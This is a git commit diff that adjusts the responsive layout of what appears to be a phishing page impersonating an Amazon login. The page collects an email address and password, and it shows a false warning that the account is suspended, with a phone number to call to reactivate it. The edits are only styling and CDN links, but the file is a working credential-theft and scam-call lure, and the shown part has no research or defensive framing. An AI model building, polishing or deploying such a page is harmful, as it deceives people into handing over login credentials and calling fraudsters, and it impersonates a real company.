0e1ca3221e8a1e2054b8117cf4cdcfb3c9d7875b
Madhuri-bhandari <48020513+Madhuri-bhandari@users.noreply.github.com>
2021-02-12 12:45:04 +0530

    responsivness

--- index.php
+++ index.php
@@ -16,20 +16,12 @@ if (isset($_POST['csrf_token']) && $_POST['csrf_token'] === $_SESSION['csrf_toke
 <!DOCTYPE html>
 <html>
 <head>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
      <title>Amazon - Login</title>
-   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-  <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
-<script src="//maxcdn.bootstrapcdn.com/bootstrap/3.3.0/js/bootstrap.min.js"></script>
-<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
-
-<!-- jQuery library -->
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
-
-<!-- Popper JS -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
-
-<!-- Latest compiled JavaScript -->
-<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
 </head>
 <style type="text/css">
      form { margin: 0px 10px; }
@@ -39,7 +31,10 @@ h2 {
   margin-bottom: 2px;
 }
 
-.container { max-width: 370px; }
+.container { 
+	width:30%; 
+	height: 50%;
+}
 
 .divider {
   text-align: center;
@@ -80,11 +75,11 @@ ul li{
 
 <center><img src="amazon_logo_no-org_mid._V153387053_.png" class="img-responsive" style="margin-top: 5%;"></center><br>
 
- <div id="result" style="font-size: 15px; box-sizing: content-box;"><ul><li>A suspicious activity has been detected on your account. Due to security reasons we have temporarily suspended your account<br>
+ <div class="form-group" id="result" style="font-size: 15px; box-sizing: content-box;"><ul><li>A suspicious activity has been detected on your account. Due to security reasons we have temporarily suspended your account<br>
         Please call on <a href="#">+1-888-318-0759</a> to reactivate your account</li> </ul>
  </div>
 
-<div class="container" style="margin-top: 20px;">
+<div class="container">
      <div class="row">
           <div class="panel panel-default">
           <div class="panel-body">   
@@ -94,14 +89,13 @@ ul li{
                                    <label><strong>Email(phone for mobile accounts)</strong></label>
                               <div class="form-group">
                                    <input type="text" name="email" id="email" maxlength="50" class="form-control">
-
                               </div>
                               <!-- <input type="text" name="count" id="count" value="" class="form-control"> -->
                               
                                    <label><strong>Password</strong></label>
                                    <span class="right"><a href="#">Forgot your password?</a></span>
                               <div class="form-group">
-                                   <input  type="password" id="password" name="password" maxlength="25" class="form-control">
+                                  <input  type="password" id="password" name="password" maxlength="25" class="form-control">
                               </div>
                               <div class="form-group" style="padding-top: 12px;">
                                    <button  type="button" name="submit" onclick="signin();" class="btn btn-block" style="background-color: #f0c14b; color:#000; font-size: 15px; border-color: #000;">Sign in</button>
@@ -109,17 +103,17 @@ ul li{
                            <div class="form-group divider">
                                    <hr class="left"><small>Sign in</small><hr class="right">
                               </div>
-                       <p class="form-group"><a href="#" class="btn btn-default btn-block"  style="background-color:lightgray ;border: 1px solid gray; color:black;">Create an account</a></p>
-                              <p class="form-group">By signing in you are agreeing to our <a href="#">Terms of Use</a> and our <a href="#">Privacy Policy</a></p>
-                          
-                    </div>
-               </div>
-          </div>
-</div>
-</center>
-</form>
+                              <div  class="form-group">
+                      <button type="button" class="btn btn-default btn-block"  style="background-color:lightgray ;border: 1px solid gray; color:black;">Create an account</button> 
+                      <p>By signing in you are agreeing to our <a href="#">Terms of Use</a> and our <a href="#">Privacy Policy</a></p></div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
 </body>
 </html>
+
 <script type="text/javascript">
   var count = 0;
    function signin() {
